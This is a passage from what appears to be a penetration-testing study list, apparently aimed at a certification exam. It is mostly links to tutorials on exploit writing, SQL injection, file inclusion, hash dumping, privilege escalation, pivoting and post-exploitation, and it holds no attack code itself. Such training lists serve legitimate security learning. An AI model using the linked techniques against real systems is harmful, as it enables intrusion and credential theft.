Exploit writting tutorial part 6: Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR –[http://www.corelan.be:8800/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/](http://www.corelan.be:8800/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/)

Exploit writting tutorial part 7: Unicode – from 0x00410041 to calc –[http://www.corelan.be:8800/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/](http://www.corelan.be:8800/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/)

Exploit writting tutorial part 8: Win32 Egg Hunting –[http://www.corelan.be:8800/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/](http://www.corelan.be:8800/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/)

Exploit writting tutorial part 9: Introduction to Win32 shellcoding –[http://www.corelan.be:8800/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/](http://www.corelan.be:8800/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/)

**SQL Injection Cheat Codes:  
**

[http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

[http://resources.infosecinstitute.com/backdoor-sql-injection/](http://resources.infosecinstitute.com/backdoor-sql-injection/)

**RFI/LFI Tutorials:  
**

[https://evilzone.org/tutorials/remote-file-inclusion\(rfi\)/](https://evilzone.org/tutorials/remote-file-inclusion%28rfi%29/)

[http://www.hackersonlineclub.com/lfi-rfi](http://www.hackersonlineclub.com/lfi-rfi)

[https://0xzoidberg.wordpress.com/category/security/lfi-rfi/](https://0xzoidberg.wordpress.com/category/security/lfi-rfi/)

**NMAP Vulsan:  
**

[http://www.computec.ch/projekte/vulscan/download/nmap\_nse\_vulscan-2.0.tar.gz](http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz)

**Online Hash Cracking:  
**

[http://www.objectif-securite.ch/](http://www.objectif-securite.ch/)

Dump Windows Password Hashes:

[http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html](http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html)

**Windows Previlige Escalation:  
**

[http://it-ovid.blogspot.in/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.in/2012/02/windows-privilege-escalation.html)

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

**Linux Previlige Escalation:  
**

[http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation.html](http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation.html)

[http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)

[http://www.rebootuser.com/?p=1758](http://www.rebootuser.com/?p=1758)

**Tunneling & Port Forwarding:  
**

[http://magikh0e.ihtb.org/pubPapers/ssh\_gymnastics\_tunneling.html](http://magikh0e.ihtb.org/pubPapers/ssh_gymnastics_tunneling.html) \(Very Good\)

[http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html](http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html)

[http://www.danscourses.com/Network-Penetration-Testing/metasploit-pivoting.html](http://www.danscourses.com/Network-Penetration-Testing/metasploit-pivoting.html)

[http://carnal0wnage.attackresearch.com/2007/09/using-metasploit-to-pivot-through\_06.html](http://carnal0wnage.attackresearch.com/2007/09/using-metasploit-to-pivot-through_06.html)

[http://www.offensive-security.com/metasploit-unleashed/Portfwd](http://www.offensive-security.com/metasploit-unleashed/Portfwd)

[http://www.offensive-security.com/metasploit-unleashed/Pivoting](http://www.offensive-security.com/metasploit-unleashed/Pivoting)

[http://www.howtoforge.com/reverse-ssh-tunneling](http://www.howtoforge.com/reverse-ssh-tunneling)

[http://ftp.acc.umu.se/pub/putty/putty-0.57/htmldoc/Chapter7.html](http://ftp.acc.umu.se/pub/putty/putty-0.57/htmldoc/Chapter7.html) \(Plink\)

[http://www.offensive-security.com/metasploit-unleashed/Msfvenom](http://www.offensive-security.com/metasploit-unleashed/Msfvenom)

**Useful Links:  
**

[http://www.fuzzysecurity.com/tutorials.html](http://www.fuzzysecurity.com/tutorials.html) – Exploit tutorials

[https://www.corelan.be/index.php/articles/](https://www.corelan.be/index.php/articles/) – Exploit tutorials

[http://www.securitytube.net/](http://www.securitytube.net/) – Training videos

[http://www.offensive-security.com/blog/](http://www.offensive-security.com/blog/) – Offensive Security blog

[http://blog.g0tmi1k.com/](http://blog.g0tmi1k.com/) – Security blog

[http://carnal0wnage.attackresearch.com](http://carnal0wnage.attackresearch.com)

[http://cybershakti.my3gb.com/](http://cybershakti.my3gb.com/)

[http://www.offensive-security.com/metasploit-unleashed/Introduction](http://www.offensive-security.com/metasploit-unleashed/Introduction)

[http://www.securityfocus.com/](http://www.securityfocus.com/)

[http://www.exploit-db.com/](http://www.exploit-db.com/)

[http://nmap.org/nsedoc/](http://nmap.org/nsedoc/)

[http://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/](http://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)

[http://incolumitas.com/wp-content/uploads/2012/12/blackhats\_view.pdf](http://incolumitas.com/wp-content/uploads/2012/12/blackhats_view.pdf)

[http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)

[http://pentestmonkey.net/tools/windows-privesc-check](http://pentestmonkey.net/tools/windows-privesc-check)

**Videos:  
**

[http://www.securitytube.net/](http://www.securitytube.net/)

[http://www.rmccurdy.com/scripts/videos/](http://www.rmccurdy.com/scripts/videos/) \(milliworm exploit tutorial\)

[http://www.cs.fsu.edu/~redwood/OffensiveSecurity/lectures.html](http://www.cs.fsu.edu/~redwood/OffensiveSecurity/lectures.html) \(Offensive Secuirty Lectures\)

**Privilege Escalation in Windows**:

[http://www.youtube.com/watch?v=kMG8IsCohHA](http://www.youtube.com/watch?v=kMG8IsCohHA) Encyclopaedia Of Windows Privilege Escalation – Brett Moore

[http://www.youtube.com/watch?v=\_8xJaaQlpBo](http://www.youtube.com/watch?v=_8xJaaQlpBo) DerbyCon 3 0 2105 Windows Attacks At Is The New Black Rob Fuller And Chris Gates

[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738) Elevating privileges by exploiting weak folder permissions

**Buffer Overflow Tutorial:  
**

[http://www.frequency.com/video/athcon-hack-in-paris-demo-1/40181156](http://www.frequency.com/video/athcon-hack-in-paris-demo-1/40181156)

[http://www.savevid.com/video/athcon-hack-in-paris-demo-2.html](http://www.savevid.com/video/athcon-hack-in-paris-demo-2.html)

[http://www.frequency.com/video/athcon-hack-in-paris-demo-3/11306148](http://www.frequency.com/video/athcon-hack-in-paris-demo-3/11306148)

[https://www.youtube.com/watch?v=ANlROJNWtCs&list=PLM0IiVYClP2vC3A6Uz\_ESV86kBVYei5qx\(Python](https://www.youtube.com/watch?v=ANlROJNWtCs&list=PLM0IiVYClP2vC3A6Uz_ESV86kBVYei5qx%28Python) Penetration Testing\)

[https://www.youtube.com/watch?v=Sye3mu-EoTI](https://www.youtube.com/watch?v=Sye3mu-EoTI) \(Bash Scripting by Peter Chubb\)

[https://www.youtube.com/watch?v=GPjcSxyIIUc](https://www.youtube.com/watch?v=GPjcSxyIIUc) \(BASH Scripting by Lee Baird \)

[https://www.youtube.com/watch?v=kPxavpgos2I](https://www.youtube.com/watch?v=kPxavpgos2I) \(LFI/RFI\)

[https://www.youtube.com/watch?v=pnqcHU2qFiA](https://www.youtube.com/watch?v=pnqcHU2qFiA) \(LFI/RFI\)

[http://www.securitytube.net/video/7640](http://www.securitytube.net/video/7640) \(Simple buffer overflow\)

[https://www.youtube.com/watch?v=y2zrEAwmdws](https://www.youtube.com/watch?v=y2zrEAwmdws) \(Mona.py\)

[http://www.securitytube.net/video/7735](http://www.securitytube.net/video/7735) \(Avoiding bad characters\)

**PDF:  
**

[https://www.yumpu.com/en/document/view/14963680/from-sqli-to-shell](https://www.yumpu.com/en/document/view/14963680/from-sqli-to-shell) \(SQL Injection\)

[https://cyberwar.nl/d/hak5.org\_LinuxUnixBSDPost-ExploitationCommandList\_copy-20130228.pdf\(Linux](https://cyberwar.nl/d/hak5.org_LinuxUnixBSDPost-ExploitationCommandList_copy-20130228.pdf%28Linux) Unix Post Exploitation Command\)

[http://www.scribd.com/doc/245679444/hak5-org-OSXPost-Exploitation-copy-20130228-pdf\#scribd](http://www.scribd.com/doc/245679444/hak5-org-OSXPost-Exploitation-copy-20130228-pdf#scribd) \(Post Exploitation Command List\)

[http://www.sans.org/security-resources/sec560/netcat\_cheat\_sheet\_v1.pdf](http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf) \(Netcat\)

[http://download.vulnhub.com/pentesterlab/php\_include\_and\_post\_exploitation.pdf](http://download.vulnhub.com/pentesterlab/php_include_and_post_exploitation.pdf) \(PHP Include and Post Exploitation\)

**Best Book I refer:  
**

[http://www.amazon.com/Penetration-Testing-Hands-On-Introduction-Hacking/dp/1593275641](http://www.amazon.com/Penetration-Testing-Hands-On-Introduction-Hacking/dp/1593275641)

**Windows compiled Exploit Reference:  
**

Those  who have not enough lab time to compile their windows exploit, I will  recommend you to download and compile the Mike Czumak  Windows pre-compiled reference chart. I compiled it using Visual Studio  and GNU Code-blocks, really it will very useful at the time of exam.

I uploaded those pre-compiled exploits in mediafire with password protected, but i discourage that  becoz exploit compilation is one of the exercise in the course so you have to do it your own.  

[http://www.securitysift.com/download/MS\_privesc\_and\_exploits\_table.csv](http://www.securitysift.com/download/MS_privesc_and_exploits_table.csv)

Windows  Tools, Scripts and Pre-Compiled Exploit for Remote and Privileage Escalation:



